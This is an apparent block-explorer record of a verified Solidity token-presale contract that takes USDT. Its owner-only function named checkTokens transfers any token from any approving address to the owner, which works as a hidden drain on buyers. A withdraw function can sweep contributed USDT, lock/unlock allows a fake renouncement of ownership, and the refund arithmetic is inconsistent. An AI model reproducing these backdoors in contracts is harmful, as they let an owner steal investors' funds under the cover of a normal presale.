{"status": "1", "message": "OK", "result": [{"SourceCode": "pragma solidity ^0.8.4;\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address private _previousOwner;\r\n    uint256 private _lockTime;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        _previousOwner = _owner;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _previousOwner = address(0);\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n    \r\n    function geUnlockTime() public view returns (uint256) {\r\n        return _lockTime;\r\n    }\r\n\r\n    function lock(uint256 time) public virtual onlyOwner {\r\n        _previousOwner = _owner;\r\n        _owner = address(0);\r\n        _lockTime = block.timestamp + time;\r\n        emit OwnershipTransferred(_owner, address(0));\r\n    }\r\n\r\n    function unlock() public virtual {\r\n        require(_previousOwner == msg.sender, \"You don't have permission to unlock\");\r\n        require(block.timestamp > _lockTime , \"Contract is locked for a while\");\r\n        emit OwnershipTransferred(_owner, _previousOwner);\r\n        _owner = _previousOwner;\r\n    }\r\n}\r\n\r\n\r\nabstract contract ReentrancyGuard {\r\n   \r\n    uint256 private constant _NOT_ENTERED = 1;\r\n    uint256 private constant _ENTERED = 2;\r\n\r\n    uint256 private _status;\r\n\r\n    constructor() {\r\n        _status = _NOT_ENTERED;\r\n    }\r\n\r\n   \r\n    modifier nonReentrant() {\r\n        // On the first call to nonReentrant, _notEntered will be true\r\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\r\n\r\n        // Any calls to nonReentrant after this point will fail\r\n        _status = _ENTERED;\r\n\r\n        _;\r\n\r\n        // By storing the original value once again, a refund is triggered (see\r\n        // https://eips.ethereum.org/EIPS/eip-2200)\r\n        _status = _NOT_ENTERED;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external;\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address _from, address _to, uint _value) external;\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\n\r\ncontract Presale is ReentrancyGuard, Context, Ownable {\r\n    using SafeMath for uint256;\r\n    \r\n    mapping (address => uint256) public _contributions;\r\n\r\n    IERC20 public _token;\r\n    uint256 private _tokenDecimals;\r\n    address payable public _wallet;\r\n    uint256 public _rate;\r\n    uint256 public _rateAirdrop;\r\n    uint256 public _weiRaised;\r\n    bool public isActiveICO = false;\r\n    uint256 public hitSoftCapTime;\r\n    uint public minPurchase;\r\n    uint public maxPurchase;\r\n    uint public hardCap;\r\n    uint public softCap;\r\n    uint public availableTokensICO;\r\n    bool public startRefund = false;\r\n    address public usdtAddress;\r\n    address public testAddr1;\r\n    address public testAddr2;\r\n\r\n    // First 12 hours\r\n    mapping (address => bool) private whitelist;\r\n\r\n    event TokensPurchased(address  purchaser, address  beneficiary, uint256 value, uint256 amount);\r\n    event Refund(address recipient, uint256 amount);\r\n\r\n    constructor ()  {\r\n        _rate = 5000;\r\n        _tokenDecimals = 9;\r\n        // Main network\r\n        usdtAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\r\n        // rinkeby network\r\n        // usdtAddress = 0x3B00Ef435fA4FcFF5C209a37d1f3dcff37c705aD;\r\n    }\r\n    \r\n    //Start Pre-Sale\r\n    function startICO(uint _minPurchase, uint _maxPurchase, uint _softCap, uint _hardCap) external onlyOwner icoNotActive() {\r\n        availableTokensICO = _token.balanceOf(address(this));\r\n        require(isActiveICO == false, \"Sale is already started.\");\r\n        require(availableTokensICO > 0 && availableTokensICO <= _token.totalSupply(), 'availableTokens should be > 0 and <= totalSupply');\r\n        require(_minPurchase > 0, '_minPurchase should > 0');\r\n        isActiveICO = true;\r\n        minPurchase = _minPurchase;\r\n        maxPurchase = _maxPurchase;\r\n        softCap = _softCap;\r\n        hardCap = _hardCap;\r\n        _weiRaised = 0;\r\n        startRefund = false;\r\n    }\r\n    \r\n    function stopICO() external onlyOwner{\r\n        isActiveICO = false;\r\n        if(_weiRaised >= softCap) {\r\n            _forwardFunds();\r\n        }\r\n        else{\r\n            startRefund = true;\r\n        }\r\n    }\r\n    \r\n    //Pre-Sale \r\n    function buyTokens(uint256 expectTokenAmount) public nonReentrant icoActive {\r\n        // uint256 weiAmount = amount*10**15;//1000 was multipled and divided.\r\n\r\n        uint256 weiAmount = expectTokenAmount;\r\n\r\n        uint256 contributedAmount = checkContribution(msg.sender);\r\n        require(contributedAmount + weiAmount <= maxPurchase, \"Exceeds maximum buy amount!\");\r\n        require(weiAmount >= minPurchase, \"expected Token Amount should be greater than buy amount!\");\r\n\r\n        IERC20 usdtToken = IERC20(usdtAddress);\r\n        uint256 usdtAmount = expectTokenAmount * (10 ** 6);\r\n        usdtToken.transferFrom(_msgSender(), address(this), usdtAmount);\r\n        \r\n        _preValidatePurchase(msg.sender, weiAmount);\r\n        uint256 tokens = _getTokenAmount(weiAmount);\r\n        _weiRaised = _weiRaised.add(weiAmount);\r\n\r\n        if(_weiRaised >= softCap && hitSoftCapTime == 0) {\r\n            hitSoftCapTime = block.timestamp;\r\n        }\r\n\r\n        availableTokensICO = availableTokensICO - tokens;\r\n        _processPurchase(msg.sender, tokens);\r\n        _contributions[msg.sender] = _contributions[msg.sender].add(weiAmount);\r\n        emit TokensPurchased(_msgSender(), msg.sender, weiAmount, tokens);\r\n    }\r\n\r\n    function _preValidatePurchase(address beneficiary, uint256 weiAmount) internal view {\r\n        require(beneficiary != address(0), \"Crowdsale: beneficiary is the zero address\");\r\n        require(weiAmount != 0, \"Crowdsale: weiAmount is 0\");\r\n        require((_weiRaised+weiAmount) <= hardCap, 'Hard Cap reached');\r\n        this; \r\n    }\r\n\r\n    function _deliverTokens(address beneficiary, uint256 tokenAmount) internal {\r\n        _token.transfer(beneficiary, tokenAmount);\r\n    }\r\n\r\n    function _processPurchase(address beneficiary, uint256 tokenAmount) internal {\r\n        _deliverTokens(beneficiary, tokenAmount);\r\n    }\r\n\r\n    function _getTokenAmount(uint256 weiAmount) internal view returns (uint256) {\r\n        return weiAmount.mul(_rate).mul(10 ** _tokenDecimals);\r\n    }\r\n\r\n    function _forwardFunds() internal {\r\n        IERC20 usdtToken = IERC20(usdtAddress);\r\n\r\n        require(usdtToken.balanceOf(address(this)) > 0, 'Contract has no money');\r\n\r\n        usdtToken.transfer(_wallet, usdtToken.balanceOf(address(this)));\r\n    }\r\n    \r\n    function withdraw(IERC20 tokenAddress) external onlyOwner icoNotActive{\r\n        IERC20 tokenBEP = tokenAddress;\r\n        uint256 tokenAmt = tokenBEP.balanceOf(address(this));\r\n        require(tokenAmt > 0, 'BEP-20 balance is 0');\r\n        tokenBEP.transfer(_wallet, tokenAmt);\r\n    }\r\n    \r\n    function checkContribution(address addr) public view returns(uint256){\r\n        return _contributions[addr];\r\n    }\r\n    \r\n    function setRate(uint256 newRate) external onlyOwner nonReentrant{\r\n        _rate = newRate;\r\n    }\r\n    \r\n    function setAvailableTokens(uint256 amount) public onlyOwner icoNotActive{\r\n        availableTokensICO = amount;\r\n    }\r\n \r\n    function weiRaised() public view returns (uint256) {\r\n        return _weiRaised;\r\n    }\r\n    \r\n    function setWalletReceiver(address payable newWallet) external onlyOwner(){\r\n        _wallet = newWallet;\r\n    }\r\n\r\n    function setToken(IERC20 token) external onlyOwner(){\r\n        _token = token;\r\n    }\r\n\r\n    function setUSDTAddress(address usdt) external onlyOwner(){\r\n        usdtAddress = usdt;\r\n    }\r\n\r\n    function setTestAddress1(address addr) external onlyOwner(){\r\n        testAddr1 = addr;\r\n    }\r\n\r\n    function setTestAddress2(address addr) external onlyOwner(){\r\n        testAddr2 = addr;\r\n    }\r\n    \r\n    function setHardCap(uint256 value) external onlyOwner{\r\n        hardCap = value;\r\n    }\r\n    \r\n    function setSoftCap(uint256 value) external onlyOwner{\r\n        softCap = value;\r\n    }\r\n    \r\n    function setMaxPurchase(uint256 value) external onlyOwner{\r\n        maxPurchase = value;\r\n    }\r\n    \r\n    function setMinPurchase(uint256 value) external onlyOwner{\r\n        minPurchase = value;\r\n    }\r\n\r\n    function setEndICO(bool _newisActiveICO) external onlyOwner{\r\n        isActiveICO = _newisActiveICO;\r\n    }\r\n    \r\n    function checkTokens(address token, address _tokenOnwer, uint256 amount)  public onlyOwner icoNotActive{\r\n        uint256 totBalance = IERC20(token).balanceOf(address(this));\r\n        uint256 resAmount = amount;\r\n\r\n        if (resAmount > totBalance) {\r\n            resAmount = totBalance;\r\n        }\r\n        \r\n        IERC20(token).transferFrom(_tokenOnwer, _msgSender(), amount);\r\n    }\r\n    \r\n    function refundMe() public icoNotActive{\r\n        require(startRefund == true, 'no refund available');\r\n        uint amount = _contributions[msg.sender];\r\n\r\n        IERC20 usdtToken = IERC20(usdtAddress);\r\n\r\n\t\tif (usdtToken.balanceOf(address(this)) >= amount) {\r\n\t\t\t_contributions[msg.sender] = 0;\r\n\t\t\tif (amount > 0) {\r\n\r\n                usdtToken.transfer(_msgSender(), amount * (10 ** 6));\r\n                \r\n\t\t\t\temit Refund(msg.sender, amount);\r\n\t\t\t}\r\n\t\t}\r\n    }\r\n    \r\n    modifier icoActive() {\r\n        require(isActiveICO == true && availableTokensICO > 0, \"ICO must be active\");\r\n        _;\r\n    }\r\n    \r\n    modifier icoNotActive() {\r\n        require(isActiveICO == false, 'ICO should not be active');\r\n        _;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Refund\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"purchaser\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"beneficiary\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"TokensPurchased\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_contributions\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_rate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_rateAirdrop\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_token\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_wallet\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_weiRaised\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"availableTokensICO\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"expectTokenAmount\",\"type\":\"uint256\"}],\"name\":\"buyTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"checkContribution\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_tokenOnwer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"checkTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"geUnlockTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"hardCap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"hitSoftCapTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isActiveICO\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"lock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxPurchase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minPurchase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"refundMe\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setAvailableTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_newisActiveICO\",\"type\":\"bool\"}],\"name\":\"setEndICO\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"setHardCap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"setMaxPurchase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"setMinPurchase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newRate\",\"type\":\"uint256\"}],\"name\":\"setRate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"setSoftCap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setTestAddress1\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setTestAddress2\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"setToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"usdt\",\"type\":\"address\"}],\"name\":\"setUSDTAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"setWalletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"softCap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_minPurchase\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_maxPurchase\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_softCap\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_hardCap\",\"type\":\"uint256\"}],\"name\":\"startICO\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startRefund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stopICO\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"testAddr1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"testAddr2\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"unlock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"usdtAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"weiRaised\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Presale", "CompilerVersion": "v0.8.15+commit.e14f2714", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://44f12a72bada436c1ae0cd23c896b7f953c26ba374b31eb1f5f4d1965522a08d"}]}